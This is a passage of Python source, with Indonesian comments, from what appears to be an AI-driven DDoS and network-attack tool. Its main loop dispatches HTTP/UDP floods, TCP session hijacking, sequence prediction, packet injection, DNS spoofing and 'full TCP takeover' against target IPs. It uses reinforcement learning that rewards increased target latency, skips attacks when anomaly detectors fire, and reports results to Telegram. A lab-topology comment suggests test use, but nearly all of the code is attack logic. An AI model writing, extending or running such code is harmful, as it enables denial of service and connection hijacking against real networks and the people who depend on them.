            use_https = input_host.startswith("https") or port == 443
            await flooder.http_or_https_flood(input_host, port, duration, use_https=use_https)
        elif method == 5:
            flooder.tcp_hijack(duration)
        # Contoh panggilan dalam while True:
        elif method == 6:
             # Ganti IP di bawah ini sesuai topologi uji Anda (LAN/VirtualBox)
            flooder.tcp_hijack_realistic(victim_ip="192.168.1.100", gateway_ip="192.168.1.1", duration=10)
        elif method == 7:
            Flooder.predict_seq(current_ip, port)
        elif method == 8:
            Flooder.desync_connection("192.168.1.5", 12345, current_ip, port, ack=1000)
        elif method == 9:
            Flooder.sniff_and_inject(current_ip)
        elif method == 10:
            Flooder.dns_spoof_auto()  # Hanya placeholder
        elif method == 11:
            Flooder.payload_aware_inject_auto()  # Hanya placeholder
        elif method == 12:
            Flooder.inject_payload("192.168.1.10", current_ip, 1234, port, b"HACKED_INJECT_PAYLOAD")
        elif method == 13:
            Flooder.full_tcp_takeover("192.168.1.101", 12345, current_ip, port)
        elif method == 14:
            flooder.tcp_stealth_valid(duration=15)

        else:
            flooder.udp_flood(duration)

        latency = collect_feedback(current_ip, port)
        reward = max(0, 5 - latency)

        ocl_model.learn_one(features_dict, method)
        metric.update(method, method)  # optional, dummy accuracy tracking
        logging.debug(f"OCL Accuracy (raw): {metric.get():.2f}")

        ai.learn_from_feedback(features, method)
        if method < TOTAL_METHODS:
            rl_agent.train_step(features, method, reward)
        deep_X.append(features)
        deep_y.append(method)

        if len(deep_X) >= 10:
            deep_ai.train(deep_X, deep_y)
            deep_X, deep_y = [], []

        logging.info(f"📡 Latency: {latency:.2f}s | ⭐ Reward: {reward:.2f}")
        if anomaly_detector.is_anomalous(features):
            logging.warning("🚨 Deteksi anomali: kombinasi fitur mencurigakan.")
            score = anomaly_detector.model.decision_function([features])[0]
            logging.warning(f"🧪 Skor anomaly: {score:.4f}")
            send_log_to_telegram(
                f"🚨 Anomali Terdeteksi!\n"
                f"Target: {current_ip}:{port}\n"
                f"Metode: {method_names[method]}\n"
                f"Skor: {score:.4f}\n"
                f"Latency: {latency:.2f}s"
            )
            continue  # Lewati serangan jika terdeteksi anomali

        if ae_anomaly_detector.is_anomalous(features):
            logging.warning("🚨 AutoEncoder mendeteksi anomali.")
            send_log_to_telegram(
                f"🚨 AE Anomaly Terdeteksi!\nTarget: {current_ip}:{port}\nMetode: {method_names[method]}\nLatency: {latency:.2f}s"
            )
            continue

        report_ddos_event(
        current_ip,
        port,
        method_names[method] + (" (HTTPS)" if method == 4 and use_https else " (HTTP)" if method == 4 else ""),
        latency
        )


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(Fore.RED + "\n⛔ Dihentikan oleh pengguna." + Style.RESET_ALL)
